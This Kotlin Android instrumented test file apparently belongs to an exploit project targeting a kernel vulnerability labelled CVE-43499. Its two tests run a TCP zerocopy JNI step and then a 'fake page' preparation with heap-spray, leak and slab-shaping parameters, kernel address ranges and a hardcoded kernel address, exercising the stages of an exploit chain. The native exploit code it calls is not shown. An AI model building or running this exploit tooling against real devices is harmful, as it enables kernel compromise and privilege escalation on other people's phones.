package com.ghostlock.app

import androidx.test.ext.junit.runners.AndroidJUnit4
import android.util.Log
import com.ghostlock.app.backend.cve43499.ktstep.run.Cve43499FakePage
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.engine.ktstep.NativePrepare43499Port
import com.ghostlock.app.engine.ktstep.NativePrepareParams
import com.ghostlock.app.engine.ktstep.NativePrepareResult
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.jni.cve43499.NativeTcpZerocopyJni
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

/** AVD TCP JNI edge: the legacy route has no fake page yet, so prepare refuses at step 40. */
@RunWith(AndroidJUnit4::class)
class NativeTcpZerocopyInstrumentedTest {
    @Test
    fun tcpJniLoadsAndRefusesWithoutFakePage() {
        val result = NativeTcpZerocopyJni.run(0x1000L, 1, true)
        assertNotNull("jni result", result)
        assertEquals(40, result!!.step)
    }

    @Test
    fun tcpWithPreparedFakePage() {
        val syscalls = NativeKernelSyscalls()
        val prepare = NativePrepare43499Port()
        assertTrue(prepare.open() is SyscallResult.Ok)
        val made = prepare.prepare(
            NativePrepareParams(
                pageSize = 4096, mmStructSize = 1024, mmSlabOrder = 2, collisions = 4,
                threadCount = 4, possibleCpus = 8, proofCount = 4, proofSeed = 0,
                rangeStart = 0xffffff8000000000uL.toLong(), rangeEnd = 0xffffffc000000000uL.toLong(),
                counterOffset = 0x1000, wakeRounds = 64, roundTimeoutUs = 1000, headerBytes = 0x1000,
                totalPokes = 32768, wordBytes = 8, handleBytes = 8, preGroups = 1,
                preShapedGroups = 0, sprayGroups = 1, postGroups = 1, leakGroups = 1,
                snitchCollisions = 4, maxAttempts = 4, pollRounds = 64, socketBuffer = 0x100000,
                mainCpu = 0, sweepTags = false,
            ),
        )
        assertTrue(made is NativePrepareResult.Ok)
        val facts = made as NativePrepareResult.Ok
        val fake = Cve43499FakePage.fromPrepared(facts, 0xffffffd186aaa1c0uL.toLong())
        val result = NativeTcpZerocopyJni.run(0x1000L, 1, true, fake)
        Log.i("GhostlockTcp", "tcp-result=" + result)
        assertNotNull(result)
        syscalls.close(facts.shapingFd)
        syscalls.close(facts.shapingPeerFd)
        prepare.close()
    }
}
